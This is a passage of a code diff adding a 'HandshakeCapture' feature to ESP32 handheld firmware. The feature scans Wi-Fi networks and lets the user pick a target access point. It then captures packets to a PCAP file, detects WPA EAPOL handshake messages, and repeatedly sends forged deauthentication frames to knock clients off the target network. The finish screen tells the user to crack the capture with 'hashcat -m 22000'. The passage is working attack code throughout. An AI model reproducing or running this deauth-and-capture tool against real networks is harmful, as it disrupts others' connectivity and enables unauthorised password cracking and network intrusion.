+  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
+  uint16_t len = (uint16_t)ctrl.sig_len;
+
+  if (len > 512) len = 512;  // cap captured size
+
+  s_totalPackets++;
+
+  // Write all data + management frames to PCAP
+  hsPcapWritePacket(pkt->payload, len, ctrl.rssi, ctrl.channel);
+
+  // Check for EAPOL
+  if (isEAPOL(pkt->payload, len)) {
+    s_eapolCount++;
+    int msgNum = eapolKeyMsgNum(pkt->payload, len);
+    if (msgNum == 1) s_gotM1 = true;
+    if (msgNum == 2) s_gotM2 = true;
+    if (msgNum == 3) s_gotM3 = true;
+    if (msgNum == 4) s_gotM4 = true;
+
+    // We need at least M1 + M2 for a crackable handshake
+    if (s_gotM1 && s_gotM2) {
+      s_gotHandshake = true;
+    }
+  }
+}
+
+// --- Deauth ---
+static void hsSendDeauth() {
+  // Fill in target BSSID
+  memcpy(&s_deauthFrame[10], s_targetAp.bssid, 6);
+  memcpy(&s_deauthFrame[16], s_targetAp.bssid, 6);
+
+  // Send on both AP and STA interfaces for maximum coverage
+  esp_wifi_set_channel(s_targetChannel, WIFI_SECOND_CHAN_NONE);
+  (void)esp_wifi_80211_tx(WIFI_IF_AP, s_deauthFrame, sizeof(s_deauthFrame), false);
+  delay(5);
+  (void)esp_wifi_80211_tx(WIFI_IF_AP, s_deauthFrame, sizeof(s_deauthFrame), false);
+  s_deauthCount++;
+}
+
+// --- WiFi init for capture mode ---
+static void hsInitCaptureWifi() {
+  wifi_mode_t wm = WIFI_MODE_NULL;
+  esp_wifi_get_mode(&wm);
+  if (wm == WIFI_MODE_NULL || wm == WIFI_MODE_STA) {
+    WiFi.mode(WIFI_AP_STA);
+    delay(50);
+  }
+
+  // Start with AP mode just so esp_wifi_80211_tx works
+  WiFi.softAP("HS_CAPTURE", nullptr, s_targetChannel, 1);
+  delay(50);
+
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_channel(s_targetChannel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous_rx_cb(hsPromiscuousCb);
+  esp_wifi_set_promiscuous(true);
+}
+
+static void hsStopCaptureWifi() {
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_STA);
+}
+
+// --- Scan ---
+static int hsCompareAp(const void* a, const void* b) {
+  return ((wifi_ap_record_t*)b)->rssi - ((wifi_ap_record_t*)a)->rssi;
+}
+
+static void hsDoScan() {
+  s_state = HsState::Scanning;
+  featureClearContent(TFT_BLACK);
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  tft.setTextFont(2);
+  tft.setTextSize(1);
+  tft.setTextColor(FEATURE_TEXT, TFT_BLACK);
+  tft.setCursor(30, 80);
+  tft.print("Scanning WiFi...");
+
+  int n = WifiScan::staWifiScanSync();
+  s_apCount = n;
+
+  if (s_apList) {
+    free(s_apList);
+    s_apList = nullptr;
+  }
+
+  if (n <= 0) {
+    s_apCount = 0;
+    return;
+  }
+
+  s_apList = (wifi_ap_record_t*)malloc((size_t)n * sizeof(wifi_ap_record_t));
+  if (!s_apList) {
+    s_apCount = 0;
+    return;
+  }
+
+  for (int i = 0; i < n; i++) {
+    wifi_ap_record_t ap = {};
+    memcpy(ap.bssid, WiFi.BSSID(i), 6);
+    strncpy((char*)ap.ssid, WiFi.SSID(i).c_str(), sizeof(ap.ssid));
+    ap.ssid[sizeof(ap.ssid) - 1] = '\0';
+    ap.rssi = WiFi.RSSI(i);
+    ap.primary = WiFi.channel(i);
+    ap.authmode = WiFi.encryptionType(i);
+    s_apList[i] = ap;
+  }
+  qsort(s_apList, (size_t)n, sizeof(wifi_ap_record_t), hsCompareAp);
+
+  WiFi.scanDelete();
+  s_selIdx = 0;
+  s_listPage = 0;
+  s_state = HsState::ListReady;
+}
+
+// --- Display ---
+static void hsDrawList() {
+  if (!s_apList || s_apCount <= 0) {
+    featureClearContent(TFT_BLACK);
+    tft.drawFastHLine(0, 19, 240, UI_LINE);
+    tft.setTextFont(1);
+    tft.setTextSize(1);
+    tft.setTextColor(TFT_RED, TFT_BLACK);
+    tft.setCursor(30, 80);
+    tft.print("No networks found");
+    tft.setTextColor(UI_TEXT, TFT_BLACK);
+    tft.setCursor(30, 100);
+    tft.print("Press Left to rescan");
+    return;
+  }
+
+  // Bounds-check selIdx and listPage
+  if (s_selIdx >= s_apCount) s_selIdx = s_apCount - 1;
+  if (s_selIdx < 0) s_selIdx = 0;
+
+  const int perPage = hsRowsPerPage();
+  if (s_listPage < 0) s_listPage = 0;
+  int maxPage = (s_apCount + perPage - 1) / perPage - 1;
+  if (maxPage < 0) maxPage = 0;
+  if (s_listPage > maxPage) s_listPage = maxPage;
+  if (s_selIdx < s_listPage * perPage) s_listPage = s_selIdx / perPage;
+  if (s_selIdx >= (s_listPage + 1) * perPage) s_listPage = s_selIdx / perPage;
+
+  featureClearContent(TFT_BLACK);
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+  tft.setTextColor(FEATURE_TEXT, TFT_BLACK);
+  tft.setCursor(5, kHeaderY);
+  tft.print("Select target AP:");
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(160, kHeaderY);
+  tft.print(String(s_apCount) + " found");
+
+  int y = kFirstRowY;
+  int start = s_listPage * perPage;
+  int end = min(start + perPage, s_apCount);
+  if (start < 0) start = 0;
+  if (end > s_apCount) end = s_apCount;
+
+  for (int i = start; i < end; i++) {
+    // Safe SSID copy — wifi_ap_record_t.ssid is 33 bytes, null-terminated at [32]
+    char ssidBuf[16];
+    strncpy(ssidBuf, (const char*)s_apList[i].ssid, 15);
+    ssidBuf[15] = '\0';
+    // Check if SSID was truncated (length > 14)
+    size_t ssidLen = strnlen((const char*)s_apList[i].ssid, 32);
+    if (ssidLen > 14) {
+      ssidBuf[13] = '.';
+      ssidBuf[14] = '.';
+      ssidBuf[15] = '\0';
+    }
+
+    bool isSel = (i == s_selIdx);
+    uint16_t bg = isSel ? 0x4208 : TFT_BLACK;
+    uint16_t fg = isSel ? ORANGE : TFT_WHITE;
+
+    tft.fillRect(0, y, 240, kRowH - 2, bg);
+    tft.setTextColor(fg, bg);
+    tft.setCursor(3, y + 2);
+    tft.print(isSel ? ">" : " ");
+    tft.setCursor(10, y + 2);
+    tft.print(ssidBuf);
+    tft.setCursor(130, y + 2);
+    tft.print("CH");
+    tft.print(s_apList[i].primary);
+    tft.setCursor(160, y + 2);
+    tft.print(s_apList[i].rssi);
+    tft.print("dB");
+
+    // Show encryption type
+    const char* enc = s_apList[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA";
+    tft.setCursor(200, y + 2);
+    tft.print(enc);
+
+    y += kRowH;
+  }
+
+  if (featureHasTouchNavBar()) {
+    setTouchNavLabels("Rescan", "Next", "Exit", "Prev", "Pick");
+  }
+}
+
+static void hsDrawCapturing() {
+  featureClearContent(TFT_BLACK);
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+
+  // Target info
+  tft.setTextColor(FEATURE_TEXT, TFT_BLACK);
+  tft.setCursor(5, kHeaderY);
+  tft.print("CAPTURING HANDSHAKE");
+
+  char buf[64];
+  snprintf(buf, sizeof(buf), "Target: %.20s", (char*)s_targetAp.ssid);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(5, kHeaderY + 14);
+  tft.print(buf);
+
+  snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+           s_targetAp.bssid[0], s_targetAp.bssid[1], s_targetAp.bssid[2],
+           s_targetAp.bssid[3], s_targetAp.bssid[4], s_targetAp.bssid[5]);
+  tft.setCursor(5, kHeaderY + 26);
+  tft.print(buf);
+
+  snprintf(buf, sizeof(buf), "Channel: %d", s_targetChannel);
+  tft.setCursor(5, kHeaderY + 38);
+  tft.print(buf);
+
+  // Stats
+  int statsY = kHeaderY + 60;
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+  tft.setCursor(5, statsY);
+  tft.print("EAPOL captured: ");
+  tft.setTextColor(s_eapolCount > 0 ? GREEN : TFT_RED, TFT_BLACK);
+  tft.print(s_eapolCount);
+
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+  tft.setCursor(5, statsY + 12);
+  tft.print("Messages: ");
+  tft.setTextColor(s_gotM1 ? GREEN : TFT_RED, TFT_BLACK);
+  tft.print("M1");
+  tft.setTextColor(s_gotM2 ? GREEN : TFT_RED, TFT_BLACK);
+  tft.print(" M2");
+  tft.setTextColor(s_gotM3 ? GREEN : TFT_RED, TFT_BLACK);
+  tft.print(" M3");
+  tft.setTextColor(s_gotM4 ? GREEN : TFT_RED, TFT_BLACK);
+  tft.print(" M4");
+
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+  tft.setCursor(5, statsY + 24);
+  tft.print("Deauths sent: ");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.print(s_deauthCount);
+
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+  tft.setCursor(5, statsY + 36);
+  tft.print("Total packets: ");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.print(s_totalPackets);
+
+  // PCAP file path
+  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
+  tft.setCursor(5, statsY + 52);
+  tft.print("File: ");
+  tft.print(s_pcapPath);
+
+  // Handshake status
+  if (s_gotHandshake) {
+    tft.setTextColor(GREEN, TFT_BLACK);
+    tft.setTextFont(2);
+    tft.setCursor(30, statsY + 70);
+    tft.print("HANDSHAKE CAPTURED!");
+    tft.setTextFont(1);
+  } else {
+    // Progress / time remaining
+    uint32_t elapsed = (millis() - s_captureStartMs) / 1000;
+    uint32_t remaining = (kCaptureTimeout / 1000) - elapsed;
+    tft.setTextColor(TFT_CYAN, TFT_BLACK);
+    tft.setCursor(5, statsY + 70);
+    tft.print("Timeout in ");
+    tft.print(remaining);
+    tft.print("s");
+  }
+
+  if (featureHasTouchNavBar()) {
+    setTouchNavLabels(s_gotHandshake ? "Stop" : "Stop", "", "Exit", "", "");
+  }
+}
+
+static void hsDrawDone() {
+  featureClearContent(TFT_BLACK);
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  tft.setTextFont(2);
+  tft.setTextSize(1);
+
+  if (s_gotHandshake) {
+    tft.setTextColor(GREEN, TFT_BLACK);
+    tft.setCursor(20, 60);
+    tft.print("Handshake captured!");
+    tft.setTextFont(1);
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.setCursor(20, 90);
+    tft.print("PCAP saved to SD:");
+    tft.setCursor(20, 105);
+    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+    tft.print(s_pcapPath);
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.setCursor(20, 125);
+    tft.print("Crack with:");
+    tft.setCursor(20, 140);
+    tft.setTextColor(TFT_CYAN, TFT_BLACK);
+    tft.print("hashcat -m 22000");
+    tft.setCursor(20, 155);
+    tft.print("file.pcap wordlist");
+  } else {
+    tft.setTextColor(TFT_RED, TFT_BLACK);
+    tft.setCursor(30, 60);
+    tft.print("No handshake captured");
+    tft.setTextFont(1);
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.setCursor(30, 90);
+    tft.print("Try again closer to the AP");
+    tft.setCursor(30, 105);
+    tft.print("or wait for client activity");
+  }
+
+  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
+  tft.setCursor(20, 140);
+  tft.print("EAPOL: ");
+  tft.print(s_eapolCount);
+  tft.print("  Packets: ");
+  tft.print(s_totalPackets);
+
+  if (featureHasTouchNavBar()) {
+    setTouchNavLabels("Rescan", "", "Exit", "", "");
+  }
+}
+
+// --- Setup / Loop ---
+void hsCaptureSetup() {
+  pauseBackgroundRadioTasks();
+  setTouchButtonInputEnabled(true);
+  featureClearContent(TFT_BLACK);
+
+  float battV = readBatteryVoltage();
+  drawStatusBar(battV, true);
+  redrawTouchButtonBar();
+
+#if HAS_PCF8574_BUTTONS
+  pcf.pinMode(BTN_UP, INPUT_PULLUP);
+  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
+  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
+  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
+#endif
+
+  setupTouchscreen();
+
+  s_state = HsState::Scanning;
+  s_apList = nullptr;
+  s_apCount = 0;
+  s_selIdx = 0;
+  s_eapolCount = 0;
+  s_totalPackets = 0;
+  s_gotHandshake = false;
+  s_gotM1 = s_gotM2 = s_gotM3 = s_gotM4 = false;
+  s_deauthCount = 0;
+
+  hsDoScan();
+  if (s_apCount > 0) {
+    hsDrawList();
+  } else {
+    featureClearContent(TFT_BLACK);
+    tft.drawFastHLine(0, 19, 240, UI_LINE);
+    tft.setTextFont(2);
+    tft.setTextColor(TFT_RED, TFT_BLACK);
+    tft.setCursor(30, 80);
+    tft.print("No networks found");
+    tft.setTextFont(1);
+    tft.setTextColor(UI_TEXT, TFT_BLACK);
+    tft.setCursor(30, 110);
+    tft.print("Press Left to rescan");
+  }
+  redrawTouchButtonBar();
+}
+
+void hsCaptureLoop() {
+  if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
+    if (s_state == HsState::Capturing) {
+      hsStopCaptureWifi();
+      hsPcapClose();
+    }
+    feature_exit_requested = true;
+    return;
+  }
+
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  updateStatusBar();
+
+  switch (s_state) {
+    case HsState::Scanning:
+      // Should not stay here long; scan is synchronous
+      break;
+
+    case HsState::ListReady: {
+      // Navigation
+      const int perPage = hsRowsPerPage();
+
+      if (isButtonPressedEdge(BTN_UP) && s_selIdx > 0) {
+        s_selIdx--;
+        if (s_selIdx < s_listPage * perPage) s_listPage--;
+        hsDrawList();
+        redrawTouchButtonBar();
+      }
+      if (isButtonPressedEdge(BTN_DOWN) && s_selIdx < s_apCount - 1) {
+        s_selIdx++;
+        if (s_selIdx >= (s_listPage + 1) * perPage) s_listPage++;
+        hsDrawList();
+        redrawTouchButtonBar();
+      }
+      if (isButtonPressedEdge(BTN_LEFT)) {
+        hsDoScan();
+        hsDrawList();
+        redrawTouchButtonBar();
+      }
+      if (isButtonPressedEdge(BTN_RIGHT) && s_apCount > 0) {
+        // Select target and start capture
+        s_targetAp = s_apList[s_selIdx];
+        s_targetChannel = s_apList[s_selIdx].primary;
+
+        // Reset state
+        s_eapolCount = 0;
+        s_totalPackets = 0;
+        s_gotHandshake = false;
+        s_gotM1 = s_gotM2 = s_gotM3 = s_gotM4 = false;
+        s_deauthCount = 0;
+
+        // Open PCAP file
+        if (!hsPcapOpen()) {
+          showNotification("PCAP Error", "SD card not available");
+          delay(2000);
+          break;
+        }
+
+        hsInitCaptureWifi();
+        s_captureStartMs = millis();
+        s_lastDeauthMs = 0;
+        s_state = HsState::Capturing;
+        hsDrawCapturing();
+        redrawTouchButtonBar();
+      }
+
+      // Touch nav
+      if (featureHasTouchNavBar()) {
+        if (isTouchNavButtonPressedEdge(BTN_LEFT)) {
+          hsDoScan();
+          hsDrawList();
+          redrawTouchButtonBar();
+        }
+        if (isTouchNavButtonPressedEdge(BTN_UP) && s_selIdx > 0) {
+          s_selIdx--;
+          if (s_selIdx < s_listPage * perPage) s_listPage--;
+          hsDrawList();
+          redrawTouchButtonBar();
+        }
+        if (isTouchNavButtonPressedEdge(BTN_DOWN) && s_selIdx < s_apCount - 1) {
+          s_selIdx++;
+          if (s_selIdx >= (s_listPage + 1) * perPage) s_listPage++;
+          hsDrawList();
+          redrawTouchButtonBar();
+        }
+        if (isTouchNavButtonPressedEdge(BTN_RIGHT) && s_apCount > 0) {
+          s_targetAp = s_apList[s_selIdx];
+          s_targetChannel = s_apList[s_selIdx].primary;
+          s_eapolCount = 0;
+          s_totalPackets = 0;
+          s_gotHandshake = false;
+          s_gotM1 = s_gotM2 = s_gotM3 = s_gotM4 = false;
+          s_deauthCount = 0;
+          if (!hsPcapOpen()) {
+            showNotification("PCAP Error", "SD card not available");
+            delay(2000);
+            break;
+          }
+          hsInitCaptureWifi();
+          s_captureStartMs = millis();
+          s_lastDeauthMs = 0;
+          s_state = HsState::Capturing;
+          hsDrawCapturing();
+          redrawTouchButtonBar();
+        }
+      }
+      break;
+    }
+
+    case HsState::Capturing: {
+      // Send periodic deauths to force handshake
+      if (!s_gotHandshake && (millis() - s_lastDeauthMs > kDeauthInterval)) {
+        hsSendDeauth();
+        s_lastDeauthMs = millis();
+      }
+
+      // Check timeout
+      if (millis() - s_captureStartMs > kCaptureTimeout) {
+        hsStopCaptureWifi();
+        hsPcapClose();
+        s_state = HsState::Done;
+        hsDrawDone();
+        redrawTouchButtonBar();
+        break;
+      }
+
+      // Stop on Left/button
+      if (isButtonPressedEdge(BTN_LEFT) ||
+          (featureHasTouchNavBar() && isTouchNavButtonPressedEdge(BTN_LEFT))) {
+        hsStopCaptureWifi();
+        hsPcapClose();
+        s_state = HsState::Done;
+        hsDrawDone();
+        redrawTouchButtonBar();
+        break;
+      }
+
+      // Update display every 500ms
+      static unsigned long lastDraw = 0;
+      if (millis() - lastDraw > 500) {
+        hsDrawCapturing();
+        redrawTouchButtonBar();
+        lastDraw = millis();
+      }
+
+      // If handshake captured, auto-stop after 5 more seconds (to grab any extra frames)
+      if (s_gotHandshake && (millis() - s_captureStartMs > 5000 + kCaptureTimeout - kCaptureTimeout)) {
+        // Give 5 seconds after first handshake detection
+        static unsigned long hsDetectedMs = 0;
+        if (hsDetectedMs == 0) hsDetectedMs = millis();
+        if (millis() - hsDetectedMs > 5000) {
+          hsStopCaptureWifi();
+          hsPcapClose();
+          s_state = HsState::Done;
+          hsDrawDone();
+          redrawTouchButtonBar();
+          hsDetectedMs = 0;
+        }
+      }
+      break;
+    }
+
+    case HsState::Done: {
+      // Left = rescan, Select = exit
+      if (isButtonPressedEdge(BTN_LEFT) ||
+          (featureHasTouchNavBar() && isTouchNavButtonPressedEdge(BTN_LEFT))) {
+        hsDoScan();
+        if (s_apCount > 0) {
+          hsDrawList();
+        }
+        redrawTouchButtonBar();
+      }
+      break;
+    }
+  }
+
+  delay(30);
+}
+
+}  // namespace HandshakeCapture
